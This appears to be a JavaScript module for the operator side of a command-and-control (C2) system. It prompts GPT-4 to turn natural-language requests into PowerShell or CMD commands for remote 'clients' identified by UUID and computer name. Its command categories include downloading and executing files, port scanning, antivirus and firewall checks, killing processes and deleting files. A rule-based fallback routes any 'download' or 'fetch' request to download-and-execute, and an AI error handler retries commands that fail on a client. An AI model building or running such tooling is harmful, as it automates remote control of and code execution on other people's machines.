const OpenAI = require('openai');
const fs = require('fs');
const path = require('path');

/**
 * True AI-Powered Command Processor using OpenAI
 * This replaces the rule-based system with real AI
 */
class TrueAICommandProcessor {
    constructor() {
        // Initialize OpenAI client
        const apiKey = process.env.OPENAI_API_KEY;
        console.log('[TRUE AI] OpenAI API Key available:', !!apiKey);
        console.log('[TRUE AI] API Key length:', apiKey ? apiKey.length : 0);
        
        if (apiKey && apiKey !== 'your-openai-api-key-here') {
            this.openai = new OpenAI({
                apiKey: apiKey
            });
            this.isAvailable = true;
        } else {
            console.log('[TRUE AI] OpenAI API key not configured, using fallback mode');
            this.isAvailable = false;
        }
        
        this.conversationHistory = new Map(); // Store conversation context per client
        this.commandPatterns = new Map(); // Learn from successful patterns
        this.errorSolutions = new Map(); // Learn from error resolutions
        
        // System prompt for AI
        this.systemPrompt = `You are an advanced AI assistant for a Command & Control (C2) system. Your role is to:

1. **Understand User Intent**: Convert natural language requests into technical commands
2. **Generate Optimized Commands**: Create PowerShell, CMD, or other commands that work reliably
3. **Handle Errors Intelligently**: When commands fail, suggest better alternatives
4. **Learn from Context**: Remember what works for each client and adapt accordingly
5. **Ensure Security**: Never generate commands that could harm the system

**Available Command Categories:**
- download_exec: Download and execute files
- system_info: Get system information (computer, memory, CPU, disk, network, users, processes, services)
- file_ops: File operations (list, copy, delete, search)
- network: Network operations (ping, port scan, network info)
- security: Security checks (firewall, antivirus)
- system_mgmt: System management (restart services, kill processes)

**Response Format:**
Always respond with a JSON object containing:
{
  "command": "actual_command_to_execute",
  "type": "powershell|cmd|wmic",
  "timeout": 300,
  "explanation": "human_readable_explanation",
  "safety_level": "safe|moderate|risky",
  "alternatives": ["alternative_command_1", "alternative_command_2"]
}

**Important Guidelines:**
- Always add error handling to commands
- Use PowerShell over CMD when possible
- Add progress indicators for long operations
- Include file verification for downloads
- Never execute dangerous commands without confirmation
- Optimize for Windows 11 compatibility (avoid deprecated WMIC)`;
    }

    /**
     * Process command using real AI
     */
    async processCommandWithAI(userInput, clientInfo, context = {}) {
        try {
            console.log('[TRUE AI] Processing command with OpenAI:', userInput);
            
            if (!this.isAvailable) {
                console.log('[TRUE AI] OpenAI not available, falling back to rule-based processing');
                return await this.fallbackProcessing(userInput, clientInfo, context);
            }
            
            // Get conversation history for this client
            const clientId = clientInfo.uuid;
            const history = this.conversationHistory.get(clientId) || [];
            
            // Prepare messages for OpenAI
            const messages = [
                {
                    role: 'system',
                    content: this.systemPrompt
                },
                ...history.slice(-10), // Last 10 messages for context
                {
                    role: 'user',
                    content: this.buildUserPrompt(userInput, clientInfo, context)
                }
            ];

            // Call OpenAI API
            const completion = await this.openai.chat.completions.create({
                model: 'gpt-4', // Use GPT-4 for better reasoning
                messages: messages,
                temperature: 0.3, // Lower temperature for more consistent results
                max_tokens: 1000,
                response_format: { type: "json_object" }
            });

            const aiResponse = JSON.parse(completion.choices[0].message.content);
            
            // Validate AI response
            if (!this.validateAIResponse(aiResponse)) {
                throw new Error('Invalid AI response format');
            }

            // Store conversation history
            history.push(
                { role: 'user', content: userInput },
                { role: 'assistant', content: completion.choices[0].message.content }
            );
            this.conversationHistory.set(clientId, history);

            // Learn from successful patterns
            this.learnFromSuccess(userInput, aiResponse, clientInfo);

            console.log('[TRUE AI] AI response:', aiResponse);
            
            return {
                success: true,
                data: {
                    command: aiResponse.command,
                    type: aiResponse.type || 'powershell',
                    timeout: aiResponse.timeout || 300,
                    explanation: aiResponse.explanation,
                    safety_level: aiResponse.safety_level || 'safe',
                    alternatives: aiResponse.alternatives || [],
                    aiProcessed: true,
                    model: 'gpt-4',
                    timestamp: new Date().toISOString()
                }
            };

        } catch (error) {
            console.error('[TRUE AI] Error processing with AI:', error);
            
            // Fallback to rule-based system
            return await this.fallbackProcessing(userInput, clientInfo, context);
        }
    }

    /**
     * Build user prompt with context
     */
    buildUserPrompt(userInput, clientInfo, context) {
        const platform = clientInfo.platform || 'unknown';
        const systemInfo = clientInfo.systemInfo || {};
        
        return `User Request: "${userInput}"

Client Context:
- Platform: ${platform}
- Computer Name: ${systemInfo.ComputerName || 'Unknown'}
- OS Version: ${systemInfo.OSVersion || 'Unknown'}
- Architecture: ${systemInfo.Is64BitOperatingSystem === 'True' ? '64-bit' : '32-bit'}
- Total Memory: ${systemInfo.TotalPhysicalMemory || 'Unknown'}

Additional Context: ${JSON.stringify(context)}

Please generate an optimized command that will work reliably on this system. Consider the platform capabilities and provide alternatives if needed.`;
    }

    /**
     * Validate AI response format
     */
    validateAIResponse(response) {
        return response && 
               typeof response.command === 'string' && 
               response.command.length > 0 &&
               ['powershell', 'cmd', 'wmic'].includes(response.type);
    }

    /**
     * Fallback to rule-based processing
     */
    async fallbackProcessing(userInput, clientInfo, context) {
        console.log('[TRUE AI] Falling back to rule-based processing');
        
        // Import the original AI processor as fallback
        const AICommandProcessor = require('./aiCommandProcessor');
        const fallbackProcessor = new AICommandProcessor();
        
        // Try to extract category and action from user input
        const extracted = this.extractCommandInfo(userInput);
        
        return await fallbackProcessor.processCommand(extracted, clientInfo);
    }

    /**
     * Extract command information from natural language
     */
    extractCommandInfo(userInput) {
        const input = userInput.toLowerCase();
        
        // Download and execute patterns
        if (input.includes('download') || input.includes('get file') || input.includes('fetch')) {
            return {
                category: 'download_exec',
                action: 'download_and_execute',
                params: this.extractDownloadParams(userInput)
            };
        }
        
        // System information patterns
        if (input.includes('system info') || input.includes('computer info') || input.includes('system information')) {
            return {
                category: 'system_info',
                action: 'computer',
                params: {}
            };
        }
        
        if (input.includes('memory') || input.includes('ram')) {
            return {
                category: 'system_info',
                action: 'memory',
                params: {}
            };
        }
        
        if (input.includes('cpu') || input.includes('processor')) {
            return {
                category: 'system_info',
                action: 'cpu',
                params: {}
            };
        }
        
        // File operations patterns
        if (input.includes('list files') || input.includes('show files') || input.includes('dir')) {
            return {
                category: 'file_ops',
                action: 'list_files',
                params: { sourcePath: 'C:\\' }
            };
        }
        
        // Network operations patterns
        if (input.includes('ping') || input.includes('test connection')) {
            return {
                category: 'network',
                action: 'ping',
                params: { target: 'google.com', count: 4 }
            };
        }
        
        // Default to system info
        return {
            category: 'system_info',
            action: 'computer',
            params: {}
        };
    }

    /**
     * Extract download parameters from natural language
     */
    extractDownloadParams(userInput) {
        const urlMatch = userInput.match(/https?:\/\/[^\s]+/);
        const executeMatch = userInput.match(/execut?e|run|launch/i);
        
        return {
            url: urlMatch ? urlMatch[0] : '',
            execute: !!executeMatch,
            savePath: 'C:\\temp\\downloaded_file.exe'
        };
    }

    /**
     * Handle errors with AI-powered solutions
     */
    async handleErrorWithAI(error, originalCommand, clientInfo, retryCount = 0) {
        try {
            console.log('[TRUE AI] Handling error with AI:', error.message);
            
            const clientId = clientInfo.uuid;
            const history = this.conversationHistory.get(clientId) || [];
            
            const messages = [
                {
                    role: 'system',
                    content: `You are an AI assistant that helps fix command execution errors. When a command fails, analyze the error and provide a better alternative.

Error: ${error.message}
Original Command: ${originalCommand.command}
Client Platform: ${clientInfo.platform}
Retry Count: ${retryCount}

Provide a JSON response with:
{
  "fixed_command": "improved_command",
  "explanation": "why_this_will_work",
  "changes_made": ["list_of_improvements"]
}`
                },
                ...history.slice(-5)
            ];

            const completion = await this.openai.chat.completions.create({
                model: 'gpt-4',
                messages: messages,
                temperature: 0.2,
                max_tokens: 500,
                response_format: { type: "json_object" }
            });

            const aiResponse = JSON.parse(completion.choices[0].message.content);
            
            // Store error solution for learning
            this.errorSolutions.set(`${clientId}_${error.message}`, {
                originalCommand: originalCommand.command,
                fixedCommand: aiResponse.fixed_command,
                explanation: aiResponse.explanation,
                timestamp: new Date().toISOString()
            });

            return {
                success: true,
                data: {
                    command: aiResponse.fixed_command,
                    explanation: aiResponse.explanation,
                    changes_made: aiResponse.changes_made,
                    aiProcessed: true,
                    retryCount: retryCount + 1
                }
            };

        } catch (aiError) {
            console.error('[TRUE AI] Error in AI error handling:', aiError);
            
            // Fallback to rule-based error handling
            const SmartErrorHandler = require('./smartErrorHandler');
            const errorHandler = new SmartErrorHandler();
            
            return await errorHandler.handleError(error, originalCommand, clientInfo, retryCount);
        }
    }

    /**
     * Learn from successful command patterns
     */
    learnFromSuccess(userInput, aiResponse, clientInfo) {
        const pattern = {
            input: userInput,
            command: aiResponse.command,
            type: aiResponse.type,
            success: true,
            timestamp: new Date().toISOString(),
            clientInfo: {
                platform: clientInfo.platform,
                osVersion: clientInfo.systemInfo?.OSVersion
            }
        };
        
        this.commandPatterns.set(`${userInput}_${clientInfo.platform}`, pattern);
        
        // Keep only last 1000 patterns to avoid memory issues
        if (this.commandPatterns.size > 1000) {
            const firstKey = this.commandPatterns.keys().next().value;
            this.commandPatterns.delete(firstKey);
        }
    }

    /**
     * Get AI statistics and learning data
     */
    getAIStatistics() {
        return {
            totalConversations: Array.from(this.conversationHistory.values()).reduce((sum, history) => sum + history.length, 0),
            learnedPatterns: this.commandPatterns.size,
            errorSolutions: this.errorSolutions.size,
            activeClients: this.conversationHistory.size,
            timestamp: new Date().toISOString()
        };
    }

    /**
     * Test AI connection
     */
    async testAIConnection() {
        try {
            if (!this.isAvailable) {
                console.log('[TRUE AI] OpenAI not available for connection test');
                return false;
            }
            
            const completion = await this.openai.chat.completions.create({
                model: 'gpt-4', // Use GPT-4 for better reasoning
                messages: [{ role: 'user', content: 'Test connection' }],
                max_tokens: 10
            });
            
            return completion.choices[0].message.content.length > 0;
        } catch (error) {
            console.error('[TRUE AI] Connection test failed:', error);
            return false;
        }
    }
}

module.exports = TrueAICommandProcessor;
